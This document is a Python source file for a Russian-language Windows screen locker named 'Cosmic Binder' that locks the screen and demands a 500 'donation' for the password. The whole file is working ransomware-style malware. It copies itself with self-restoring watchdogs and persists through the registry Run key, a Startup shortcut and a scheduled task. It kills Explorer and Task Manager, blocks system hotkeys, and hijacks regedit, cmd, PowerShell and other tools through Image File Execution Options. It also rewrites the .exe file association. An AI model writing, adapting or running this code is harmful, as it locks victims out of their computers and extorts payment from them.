import tkinter as tk
from PIL import Image, ImageTk, ImageFilter
import ctypes
import sys
import os
import subprocess
import threading
import time
import psutil
import getpass
import winreg
import atexit
import signal
import shutil
import tempfile
PASSWORD = "1488"

# --- Двусторонний watchdog ---
def start_watchdogs():
    import sys, os, subprocess, time
    script_path = os.path.abspath(sys.argv[0])
    appdata = os.environ.get('APPDATA')
    tempdir = tempfile.gettempdir()
    copy1 = os.path.join(appdata, 'cosmic_binder_copy.py')
    copy2 = os.path.join(tempdir, 'cosmic_binder_copy.py')
    # Копируем себя в AppData и Temp
    for dest in [copy1, copy2]:
        if not os.path.exists(dest):
            shutil.copy2(script_path, dest)
    # Watchdog-поток: следит за копиями и восстанавливает их
    def watchdog_loop():
        while True:
            for dest in [copy1, copy2]:
                if not os.path.exists(dest):
                    shutil.copy2(script_path, dest)
            # Если основной файл удалён — копия восстанавливает его
            if not os.path.exists(script_path):
                for src in [copy1, copy2]:
                    if os.path.exists(src):
                        shutil.copy2(src, script_path)
            time.sleep(3)
    threading.Thread(target=watchdog_loop, daemon=True).start()
    # Если запущены с --watchdog, следим за основным
    if '--watchdog' in sys.argv:
        import psutil
        main_pid = os.getppid()
        while True:
            if not psutil.pid_exists(main_pid):
                subprocess.Popen([sys.executable, script_path])
                break
            time.sleep(3)
        sys.exit(0)
start_watchdogs()

# --- Автозапуск через все способы ---
def add_to_autoruns():
    import winreg, sys, os, subprocess
    script_path = os.path.abspath(sys.argv[0])
    # Run (HKCU)
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "CosmicBinder", 0, winreg.REG_SZ, f'"{sys.executable}" "{script_path}"')
        winreg.CloseKey(key)
    except Exception: pass
    # Startup
    try:
        username = os.environ.get('USERNAME')
        startup_dir = fr"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
        shortcut_path = os.path.join(startup_dir, "CosmicBinder.lnk")
        if not os.path.exists(shortcut_path):
            import pythoncom
            from win32com.client import Dispatch
            shell = Dispatch('WScript.Shell')
            shortcut = shell.CreateShortCut(shortcut_path)
            shortcut.Targetpath = sys.executable
            shortcut.Arguments = f'"{script_path}"'
            shortcut.WorkingDirectory = os.path.dirname(script_path)
            shortcut.IconLocation = sys.executable
            shortcut.save()
    except Exception: pass
    # Планировщик задач
    try:
        cmd = f'schtasks /create /tn "CosmicBinder" /tr "\"{sys.executable}\" \"{script_path}\"" /sc ONLOGON /f'
        subprocess.run(cmd, shell=True)
    except Exception: pass
add_to_autoruns()

# --- Скрытие окна из Alt+Tab ---
def hide_from_alttab(hwnd):
    import win32con, win32gui
    ex_style = win32gui.GetWindowLong(hwnd, win32con.GWL_EXSTYLE)
    win32gui.SetWindowLong(hwnd, win32con.GWL_EXSTYLE, ex_style | win32con.WS_EX_TOOLWINDOW)

import keyboard

def block_hotkeys():
    # Блокируем популярные сочетания
    hotkeys = [
        'alt+f4', 'ctrl+alt+del', 'win+r', 'win+e', 'win+l', 'win+tab',
        'ctrl+shift+esc', 'ctrl+esc', 'alt+tab', 'alt+esc', 'ctrl+w', 'ctrl+f4',
    ]
    for hk in hotkeys:
        try:
            keyboard.block_key(hk)
        except Exception:
            pass
    # Блокируем отдельные клавиши
    for key in ['esc', 'tab', 'f4', 'lwin', 'rwin']:
        try:
            keyboard.block_key(key)
        except Exception:
            pass
block_hotkeys()


# --- Удаление следов программы ---
def remove_traces():
    try:
        import winreg
        # Удалить копии
        appdata = os.environ.get('APPDATA')
        tempdir = tempfile.gettempdir()
        copy1 = os.path.join(appdata, 'cosmic_binder_copy.py')
        copy2 = os.path.join(tempdir, 'cosmic_binder_copy.py')
        for f in [copy1, copy2]:
            try:
                if os.path.exists(f):
                    os.remove(f)
            except Exception: pass
        # Удалить автозапуск из реестра
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.DeleteValue(key, "CosmicBinder")
            winreg.CloseKey(key)
        except Exception: pass
        # Удалить из Startup
        try:
            username = os.environ.get('USERNAME')
            startup_dir = fr"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
            shortcut_path = os.path.join(startup_dir, "CosmicBinder.lnk")
            if os.path.exists(shortcut_path):
                os.remove(shortcut_path)
        except Exception: pass
        # Удалить из планировщика задач
        try:
            subprocess.run('schtasks /delete /tn "CosmicBinder" /f', shell=True)
        except Exception: pass
        # Снять IFEO-блокировки
        try:
            targets = [
                "taskmgr.exe", "regedit.exe", "cmd.exe", "msconfig.exe", "control.exe",
                "services.exe", "powershell.exe", "processhacker.exe", "autoruns.exe", "explorer.exe", "notepad.exe"
            ]
            for name in targets:
                try:
                    winreg.DeleteKey(winreg.HKEY_LOCAL_MACHINE, fr"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\{name}")
                except Exception: pass
        except Exception: pass
        # Восстановить ассоциацию .exe
        try:
            key = winreg.OpenKey(winreg.HKEY_CLASSES_ROOT, r"exefile\\shell\\open\\command", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, '"%1" %*')
            winreg.CloseKey(key)
        except Exception: pass
        # Удалить себя
        script_path = os.path.abspath(sys.argv[0])
        threading.Thread(target=lambda: (time.sleep(1), os.remove(script_path)), daemon=True).start()
    except Exception:
        pass

def check_password():
    if entry.get() == PASSWORD:
        remove_traces()
        show_taskbar()
        start_explorer()
        root.destroy()
        sys.exit()
    else:
        entry.delete(0, tk.END)
        show_error("❌ Неверный пароль!")

def show_error(msg):
    error_label.config(text=msg)
    error_label.place(relx=0.5, rely=0.92, anchor="center")
    error_label.after(2000, lambda: error_label.config(text=""))

def hide_taskbar():
    ctypes.windll.user32.ShowWindow(ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None), 0)

def show_taskbar():
    ctypes.windll.user32.ShowWindow(ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None), 1)

def block_keys(event):
    return "break"

def kill_explorer():
    os.system("taskkill /f /im explorer.exe")

def start_explorer():
    subprocess.Popen("explorer.exe")

def kill_taskmgr():
    while True:
        for proc in psutil.process_iter(['name']):
            if proc.info['name'] and proc.info['name'].lower() == "taskmgr.exe":
                try:
                    proc.kill()
                except Exception:
                    pass
        time.sleep(0.5)

def add_to_startup():
    username = getpass.getuser()
    startup_dir = fr"C:\Users\{username}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
    script_path = os.path.abspath(sys.argv[0])
    shortcut_path = os.path.join(startup_dir, "CosmicBinder.lnk")
    if not os.path.exists(shortcut_path):
        import pythoncom
        from win32com.client import Dispatch
        shell = Dispatch('WScript.Shell')
        shortcut = shell.CreateShortCut(shortcut_path)
        shortcut.Targetpath = sys.executable
        shortcut.Arguments = f'"{script_path}"'
        shortcut.WorkingDirectory = os.path.dirname(script_path)
        shortcut.IconLocation = sys.executable
        shortcut.save()

def animate_glow():
    color_list = ["#00c3ff", "#3a7bd5", "#00ecbc", "#00c3ff"]
    i = 0
    def loop():
        nonlocal i
        glow.config(highlightbackground=color_list[i], highlightcolor=color_list[i])
        i = (i + 1) % len(color_list)
        root.after(200, loop)
    loop()

def animate_entry():
    def on_key(event):
        entry.config(highlightbackground="#00ecbc")
        root.after(150, lambda: entry.config(highlightbackground="#3a7bd5"))
    entry.bind("<Key>", on_key)

def draw_gradient(canvas, color1, color2):
    width = canvas.winfo_width()
    height = canvas.winfo_height()
    r1, g1, b1 = canvas.winfo_rgb(color1)
    r2, g2, b2 = canvas.winfo_rgb(color2)
    r_ratio = float(r2 - r1) / height
    g_ratio = float(g2 - g1) / height
    b_ratio = float(b2 - b1) / height
    for i in range(height):
        nr = int(r1 + (r_ratio * i))
        ng = int(g1 + (g_ratio * i))
        nb = int(b1 + (b_ratio * i))
        color = f'#{nr//256:02x}{ng//256:02x}{nb//256:02x}'
        canvas.create_line(0, i, width, i, fill=color)

def animate_donate():
    colors = ["#00ecbc", "#00c3ff", "#3a7bd5", "#00c3ff"]
    i = 0
    def loop():
        nonlocal i
        donate_label.config(fg=colors[i])
        i = (i + 1) % len(colors)
        root.after(400, loop)
    loop()

def open_clicker():
    clicker_btn.pack_forget()
    clicker_frame.place(relx=0.5, rely=0.82, anchor="center")
    update_clicker_label()

def clicker_action():
    clicker_action.counter += 1
    update_clicker_label()
    animate_clicker_btn()
clicker_action.counter = 0

def update_clicker_label():
    clicker_label.config(text=f"Кликов: {clicker_action.counter}")

def animate_clicker_btn():
    clicker_btn2.config(bg="#00ecbc", fg="#232526")
    root.after(120, lambda: clicker_btn2.config(bg="#232526", fg="#00ecbc"))

root = tk.Tk()
root.title("Cosmic Binder")
root.attributes("-fullscreen", True)
root.attributes("-topmost", True)
root.protocol("WM_DELETE_WINDOW", lambda: None)

try:
    import win32gui
    hide_from_alttab(root.winfo_id())
except Exception:
    pass

root.bind("<Alt-F4>", lambda e: "break")
root.bind("<Control-KeyPress>", block_keys)
root.bind("<Alt-KeyPress>", block_keys)
root.bind("<Escape>", block_keys)
root.bind("<Key>", block_keys)
root.bind("<Tab>", block_keys)
root.bind("<KeyPress>", block_keys)
root.bind("<KeyRelease>", block_keys)

try:
    img = Image.open("background.jpg").resize((root.winfo_screenwidth(), root.winfo_screenheight()))
    img = img.filter(ImageFilter.GaussianBlur(8))
    bg_img = ImageTk.PhotoImage(img)
    bg_label = tk.Label(root, image=bg_img)
    bg_label.place(x=0, y=0, relwidth=1, relheight=1)
except Exception:
    canvas = tk.Canvas(root, highlightthickness=0)
    canvas.pack(fill="both", expand=True)
    root.update()
    draw_gradient(canvas, "#232526", "#3a7bd5")

donate_label = tk.Label(
    root,
    text="💸 Задонать 500 и получишь пароль 💸",
    font=("Segoe UI Black", 26, "bold"),
    fg="#00ecbc",
    bg="#232526"
)
donate_label.place(relx=0.5, rely=0.08, anchor="center")
animate_donate()

glow = tk.Frame(root, bg="#232526", highlightbackground="#00c3ff", highlightthickness=10)
glow.place(relx=0.5, rely=0.5, anchor="center", relwidth=0.38, relheight=0.62)

lock_label = tk.Label(glow, text="🔒", font=("Segoe UI Emoji", 90), bg="#232526", fg="#00c3ff")
lock_label.pack(pady=(30, 0))

label = tk.Label(glow, text="Cosmic Binder", font=("Segoe UI Black", 38, "bold"), fg="#00c3ff", bg="#232526")
label.pack(pady=(10, 0))

label2 = tk.Label(glow, text="Введите пароль для разблокировки", font=("Segoe UI", 20), fg="#ffffff", bg="#232526")
label2.pack(pady=(10, 0))

entry = tk.Entry(
    glow,
    show="*",
    font=("Segoe UI", 26),
    width=18,
    justify="center",
    bg="#1a1a1a",
    fg="#00c3ff",
    insertbackground="#00c3ff",
    relief="flat",
    highlightthickness=3,
    highlightbackground="#3a7bd5"
)
entry.pack(pady=22)
entry.focus_set()
animate_entry()

def on_enter(e): btn.config(bg="#3a7bd5", fg="#fff")
def on_leave(e): btn.config(bg="#00c3ff", fg="#232526")
btn = tk.Button(
    glow,
    text="Разблокировать",
    font=("Segoe UI", 22, "bold"),
    bg="#00c3ff",
    fg="#232526",
    activebackground="#232526",
    activeforeground="#00c3ff",
    relief="flat",
    command=check_password,
    cursor="hand2"
)
btn.pack(pady=10, ipadx=22, ipady=7)
btn.bind("<Enter>", on_enter)
btn.bind("<Leave>", on_leave)

def on_enter_cl(e): clicker_btn.config(bg="#00ecbc", fg="#232526")
def on_leave_cl(e): clicker_btn.config(bg="#232526", fg="#00ecbc")
clicker_btn = tk.Button(
    glow,
    text="Кликер",
    font=("Segoe UI", 18, "bold"),
    bg="#232526",
    fg="#00ecbc",
    activebackground="#00ecbc",
    activeforeground="#232526",
    relief="flat",
    command=open_clicker,
    cursor="hand2",
    borderwidth=3,
    highlightbackground="#00ecbc",
    highlightcolor="#00ecbc"
)
clicker_btn.pack(pady=10, ipadx=18, ipady=5)
clicker_btn.bind("<Enter>", on_enter_cl)
clicker_btn.bind("<Leave>", on_leave_cl)

clicker_frame = tk.Frame(glow, bg="#232526")
clicker_label = tk.Label(clicker_frame, text="Кликов: 0", font=("Segoe UI", 18, "bold"), fg="#00ecbc", bg="#232526")
clicker_label.pack(pady=(0, 8))
def on_enter_btn2(e): clicker_btn2.config(bg="#00ecbc", fg="#232526")
def on_leave_btn2(e): clicker_btn2.config(bg="#232526", fg="#00ecbc")
clicker_btn2 = tk.Button(
    clicker_frame,
    text="Клик!",
    font=("Segoe UI", 18, "bold"),
    bg="#232526",
    fg="#00ecbc",
    activebackground="#00ecbc",
    activeforeground="#232526",
    relief="flat",
    command=clicker_action,
    cursor="hand2",
    borderwidth=3,
    highlightbackground="#00ecbc",
    highlightcolor="#00ecbc"
)
clicker_btn2.pack(ipadx=18, ipady=5)
clicker_btn2.bind("<Enter>", on_enter_btn2)
clicker_btn2.bind("<Leave>", on_leave_btn2)

error_label = tk.Label(glow, text="", font=("Segoe UI", 17, "bold"), fg="#ff5555", bg="#232526")
error_label.place(relx=0.5, rely=0.92, anchor="center")

hide_taskbar()
kill_explorer()
add_to_startup()
threading.Thread(target=kill_taskmgr, daemon=True).start()
animate_glow()

# --- IFEO блокировка системных утилит ---
def block_ifeo():
    import winreg
    targets = [
        "taskmgr.exe", "regedit.exe", "cmd.exe", "msconfig.exe", "control.exe",
        "services.exe", "powershell.exe", "processhacker.exe", "autoruns.exe", "explorer.exe", "notepad.exe"
    ]
    for name in targets:
        try:
            key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, fr"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\{name}")
            winreg.SetValueEx(key, "Debugger", 0, winreg.REG_SZ, sys.executable)
            winreg.CloseKey(key)
        except Exception:
            pass
block_ifeo()

# --- Копирование себя в AppData и запуск оттуда ---
def copy_to_appdata():
    import shutil
    import sys
    import os
    appdata = os.environ.get('APPDATA')
    dest = os.path.join(appdata, "cosmic_binder.py")
    if not os.path.exists(dest):
        shutil.copy2(sys.argv[0], dest)
        subprocess.Popen([sys.executable, dest])
        sys.exit(0)
copy_to_appdata()

# --- Блокировка ассоциаций .exe ---
def block_exe_assoc():
    import winreg
    try:
        key = winreg.OpenKey(winreg.HKEY_CLASSES_ROOT, r"exefile\\shell\\open\\command", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "", 0, winreg.REG_SZ, f'"{sys.executable}" "%1" %*')
        winreg.CloseKey(key)
    except Exception:
        pass
block_exe_assoc()

# --- Атрибут только для чтения на свой файл ---
def set_readonly():
    import stat
    try:
        os.chmod(sys.argv[0], stat.S_IREAD)
    except Exception:
        pass
set_readonly()

root.mainloop()
